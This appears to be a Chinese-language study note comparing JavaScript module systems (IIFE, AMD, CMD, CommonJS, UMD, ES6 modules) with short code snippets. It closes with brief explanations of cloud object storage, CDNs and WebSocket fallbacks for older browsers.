1:全局function模式(将不同的功能封装成不同的全局函数)
    编码: 将不同的功能封装成不同的全局函数
    问题: 污染全局命名空间, 容易引起命名冲突或数据不安全，而且模块成员之间看不出直接关系
  IIFE创建自执行函数
    作用: 数据是私有的, 外部只能通过暴露的方法操作
    编码: 将数据和行为封装到一个函数内部, 通过给window添加属性来向外暴露接口
    问题: 如果当前这个模块依赖另一个模块怎么办?
var testUtils = function () {
    function test(data){
        console.log(data)
    }
    return {
      test
    }
}()

2:AMD(RequireJS)
 依赖必须一开始就写好
define(['./utils'], function(utils) {
  utils.request();
});

3:CMD----跟requireJS解决同样问题,只是运行机制不同。`CMD规范整合了CommonJS和AMD规范的特点`
define(function(require) {
  依赖可以就近书写
  var utils = require('./utils');
  utils.request();
});

4:CommonJS
随着 node 诞生，服务器端的模块规范 CommonJS 被创建出来。
var config = require('./config');
const {
    notExistFold,
    prompt,
} = require('./util.js');

module.exports = NAME
exports = NAME

5:UMD
amd cmd 通常只能在浏览器中使用, commonjs只能在服务端(Node)**环境下使用
(function (root, factory) {
    if (typeof exports === 'object' && typeof module === 'object')
        // commonjs
        module.exports = factory()
    else if (typeof define === 'function' && define.amd)
        // amd、cmd
        define([], factory)
    else if (typeof exports === 'object')
        // commonjs
        exports['math'] = factory()
    else
        // 全局对象, 浏览器中是 window
        root['math'] = factory()
})(this, function(){
    return { add: function(left, right) { return left + right; 
  })

6:ES6 module:(目前的浏览器还没有全部兼容 需要使用bable进行处理)
ES6 模块的设计思想是尽量的静态化，使得编译时就能确定模块的依赖关系，
以及输入和输出的变量。CommonJS 和 AMD 模块,都只能在运行时确定这些东西。比如,CommonJS 模块就是对象，输入时必须查找对象属性

import api from './config.js';
import { api as myApi } from './config.js';

export const prefix = 'https://github.com';
export default function foo() {}

ES6 module 使用import导入模块接口
import { api as myApi } from './config.js';
import()实现按需加载

## 对比差异
// Named export/import  具名导出/导入:
export { sum }   
import { sum } from 'sum'  

// Default export/import  默认导出/导入:
export default sum   
import sum from 'sum'

exports 仅仅是 module.exports 的引用
// 实际上的 exports
exports = module.exports

本质是导出exports对象{}

## CommonJS与ES6 Module最本质的区别是：动态vs静态
① CommonJS 模块输出的是一个值的拷贝,ES6 模块输出的是值的引用。
② CommonJS 模块是运行时加载,ES6 模块是编译时输出接口。

CommonJS对模块依赖的解决是“动态的”(只能在运行时,分析出对应的依赖关系)
ES6 Module是“静态的”(可以在编译时,就分析出对应的依赖关系,才能做tree shaking)

require的模块路径可以动态指定,支持传入一个表达式,我们甚至可以通过if语句判断是否加载某个模块。
因此,在CommonJS模块被执行前,并没有办法确定明确的依赖关系,模块的导入、导出发生在代码的运行阶段。

对于CommonJS来说获取的是一份导出值的拷贝,而在ES6 Module中则是值的动态映射,并且这个映射是只读的。


# 什么是COS?
COS,全称对象存储(Cloud Object Storage),COS是一种存储海量文件的分布式存储服务,
它能让用户可通过网络随时存储和查看数据。通常我们公司的图床、前端静态资源存储都会用到COS,
它能够做到让我们的静态资源摆脱对单个服务器的依赖


# CDN是什么::::::::::::::::::::::::::::::::::::::::::::::::::::::
CDN 全称 Content Delivery Network,即内容分发网络,它是在现有网络结构中增加一层遍布全球的高性能加速节点构成新的虚拟网络架构
其基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。

CDN 的工作原理:就是将源站的资源缓存CDN各个节点上,当请求命中了某个节点的资源缓存时，立即返回客户端，
避免每个请求的资源都通过源站获取，避免网络拥塞、缓解源站压力，保证用户访问资源的速度和体验
🌰🌰举一个生活中的例子，我们在某东上购买商品，快递能做到当日送达，其根本原理是通过在全国各地建设本地仓库。当用户购买商品时，通过智能仓配模式，为消费者选择就近仓库发货，从而缩短物流配送时间
../note/sublime/assets/note2023-12-26-08-44-43.png




# 扩展 webRtc：：：：Real Time Communications

webSocket 如何兼容低浏览器？

Adobe Flash Socket 、
ActiveX HTMLFile (IE) 、
基于 multipart 编码发送 XHR 、
基于长轮询的 XHR。



